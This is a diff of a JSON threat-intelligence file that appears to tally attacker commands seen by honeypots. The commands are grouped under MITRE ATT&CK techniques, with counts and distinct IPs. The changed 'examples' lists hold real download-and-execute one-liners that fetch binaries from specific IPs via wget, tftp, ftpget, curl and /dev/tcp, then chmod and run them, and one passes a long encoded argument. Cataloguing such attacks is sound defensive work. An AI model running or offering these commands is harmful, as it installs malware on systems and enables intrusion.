@@ -24,8 +24,8 @@
         "defense-impairment"
       ],
       "url": "https://attack.mitre.org/techniques/T1222/002",
-      "count": 17495,
-      "distinct_ips": 677,
+      "count": 17496,
+      "distinct_ips": 678,
       "examples": [
         ">/tmp/d && chmod 777 /tmp/d && /tmp/d && cd /tmp/",
         ">/var/d && chmod 777 /var/d && /var/d && cd /var/",
@@ -41,14 +41,14 @@
         "command-and-control"
       ],
       "url": "https://attack.mitre.org/techniques/T1105",
-      "count": 2947,
-      "distinct_ips": 449,
+      "count": 2948,
+      "distinct_ips": 450,
       "examples": [
         "(wget http://185.93.89.72/wget -O- || busybox wget http://185.93.89.72/wget -O-) > w; chmod 777 w; ./w; rm -rf w",
         "(tftp -g 185.93.89.72 -r tftp -l- || busybox tftp -g 185.93.89.72 -r tftp -l-) > t; chmod 777 t; ./t; rm -rf t",
         "(ftpget 185.93.89.72 f ftpget || busybox ftpget 185.93.89.72 f ftpget) > f; chmod 777 f; ./f; rm -rf f",
-        "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://31.77.227.121/bins/pmips; chmod 777 pmips; ./pmips; rm -rf pmips",
-        "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://31.77.227.121/bins/x86_64; chmod 777 x86_64; ./x86_64; rm -rf x86_64"
+        "nohup $SHELL -c \"curl http://116.169.58.202:6429/linux -o /tmp/ABdmnCJ3d5; if [ ! -f /tmp/ABdmnCJ3d5 ]; then wget http://116.169.58.202:6429/linux -O /tmp/ABdmnCJ3d5; fi; if [ ! -f /tmp/ABdmnCJ3d5 ]; then exec 6<>/dev/tcp/116.169.58.202/6429 && echo -n 'GET /linux' >&6 && cat 0<&6 > /tmp/ABdmnCJ3d5 ; chmod +x /tmp/ABdmnCJ3d5 && /tmp/ABdmnCJ3d5 sIkFY7PV+sFHNemYhjcxnpToK0fC/du3YwWHzMqZGmOxyObARirkmZoyN4if5ihYw/nVtGACh8/Nng5lt8n90kcq7YCZPyiZnuc1R8H/wbBmAJvdyZAaYLXP5sdANe+WkTwwmpbmO07c+c+wfAaaytObAmi/zf3HVi/pgJo1P4ac8ClCyPDCtmEUmMzLhwVkv9X9ylgp7pySMDKal/4vQdzwwqhgAJvTzJsHaLDD/sVWL+2AmTA3hpztK1jA/M28agWczt2dA3y0yPHcRyzvgJk3PpKZ6y1D0vzMqGoCh8/EhwVltsH+wkcq546cMSiamuw1Q8rmw7JoApnMzZAUaqjK/MJYKOeAmTc8kJvmLFbD+suoZQOHysSHAGC8wvrLRjvqmYY0MpqA6yNYyvzBsGIFmcTdnQ18tMj83EMt8J+QPzyenOYjVsb/1bRhDYfP05sAaL7C+MFWL+mAkD8omprsNUfA+8GwagKe3cWHBmO+1frAQzXqnJIwNpme7ztHxf7VvmoakNPMmQJov8P/xVYq7Z6GPzKGnvAqRcDyzLNkA4nF05gAaqjN8dxHKeeUkTc2nY7vI0Xc+cqoYAaf08+ZA2ixyvrHVi/pgJo1P4af6SpYw/nDvGUBn8jdmAVhqMrx3Ecr54CZNTGSmOovRNL8zKhgAJvTzJkMfLHK8sRGKu6ZiDc3noDvLU/c/cOoYASbx8udBmumz/HcRCjtgJoyPoab6SFAxPvCpmMFmNPMngR8t8z73EQr75SfNDKZmS7LSqrBa4rwCS9LDFxapOXxEoZ4ozosGP+HZIeb; fi; echo password > /tmp/.opass; chmod +x /tmp/ABdmnCJ3d5 && /tmp/ABdmnCJ3d5 sIkFY7PV+sFHNemYhjcxnpToK0fC/du3YwWHzMqZGmOxyObARirkmZoyN4if5ihYw/nVtGACh8/Nng5lt8n90kcq7YCZPyiZnuc1R8H/wbBmAJvdyZAaYLXP5sdANe+WkTwwmpbmO07c+c+wfAaaytObAmi/zf3HVi/pgJo1P4ac8ClCyPDCtmEUmMzLhwVkv9X9ylgp7pySMDKal/4vQdzwwqhgAJvTzJsHaLDD/sVWL+2AmTA3hpztK1jA/M28agWczt2dA3y0yPHcRyzvgJk3PpKZ6y1D0vzMqGoCh8/EhwVltsH+wkcq546cMSiamuw1Q8rmw7JoApnMzZAUaqjK/MJYKOeAmTc8kJvmLFbD+suoZQOHysSHAGC8wvrLRjvqmYY0MpqA6yNYyvzBsGIFmcTdnQ18tMj83EMt8J+QPzyenOYjVsb/1bRhDYfP05sAaL7C+MFWL+mAkD8omprsNUfA+8GwagKe3cWHBmO+1frAQzXqnJIwNpme7ztHxf7VvmoakNPMmQJov8P/xVYq7Z6GPzKGnvAqRcDyzLNkA4nF05gAaqjN8dxHKeeUkTc2nY7vI0Xc+cqoYAaf08+ZA2ixyvrHVi/pgJo1P4af6SpYw/nDvGUBn8jdmAVhqMrx3Ecr54CZNTGSmOovRNL8zKhgAJvTzJkMfLHK8sRGKu6ZiDc3noDvLU/c/cOoYASbx8udBmumz/HcRCjtgJoyPoab6SFAxPvCpmMFmNPMngR8t8z73EQr75SfNDKZmS7LSqrBa4rwCS9LDFxapOXxEoZ4ozosGP+HZIeb\" &",
+        "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://31.77.227.121/bins/pmips; chmod 777 pmips; ./pmips; rm -rf pmips"
       ]
     },
     {
@@ -184,6 +184,6 @@
       ]
     }
   ],
-  "total_commands": 416954,
-  "matched_commands": 148675
+  "total_commands": 416961,
+  "matched_commands": 148676
 }
